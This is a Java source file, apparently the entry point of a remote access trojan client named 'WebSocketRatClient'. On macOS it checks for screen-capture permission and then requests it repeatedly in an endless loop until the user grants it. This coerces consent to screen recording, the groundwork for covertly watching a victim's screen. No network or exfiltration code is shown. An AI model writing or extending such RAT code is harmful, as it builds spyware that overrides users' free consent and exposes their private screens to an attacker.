package io.github.machineswillrise.websocketrat.client;

import io.github.machineswillrise.websocketrat.client.automation.macos.CoreGraphicsLibrary;

public class WebSocketRatClient
{
	public static void main(String[] args)
	{
		OperatingSystem os = OperatingSystem.detectCurrentOperatingSystem();

		if (os == OperatingSystem.MAC_OS)
		{
			boolean screenCaptureAllowed = CoreGraphicsLibrary.INSTANCE.CGPreflightScreenCaptureAccess();

			while (!screenCaptureAllowed)
			{
				screenCaptureAllowed = CoreGraphicsLibrary.INSTANCE.CGRequestScreenCaptureAccess();
			}
		}
	}
}
